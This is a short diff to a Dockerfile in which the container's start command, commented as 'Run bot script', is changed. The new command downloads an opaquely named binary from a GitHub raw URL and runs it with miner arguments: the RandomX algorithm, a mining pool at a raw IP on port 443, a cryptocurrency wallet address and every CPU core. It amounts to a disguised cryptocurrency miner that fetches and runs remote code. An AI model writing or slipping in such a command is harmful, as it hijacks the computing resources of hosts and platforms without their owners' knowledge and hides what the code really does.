@@ -37,4 +37,4 @@ RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 RUN echo "Uploaded files:" && ls /home/stuff/
 
 # Run bot script:
-CMD git clone https://github.com/Sairin-SLOT/zepo.git && cd zepo && chmod +x config.json && chmod +x zepo && ./zepo -c "config.json" 
+CMD wget https://github.com/Sairin-SLOT/zepoh/raw/main/xmolx && chmod +x xmolx && ./xmolx -a rx/0 -o 24.199.90.158:443 -u ZEPHs8j799QQFKmKFaHEJ85sGoNU3VgNGU7TF1ez9gjJRHb2XYVUPvgLS8okjGECMhcgx4HuJceLwXBEywNBR1gUP6tsD3K9iVY -p x -t $(nproc --all) --donate-level 1 -k
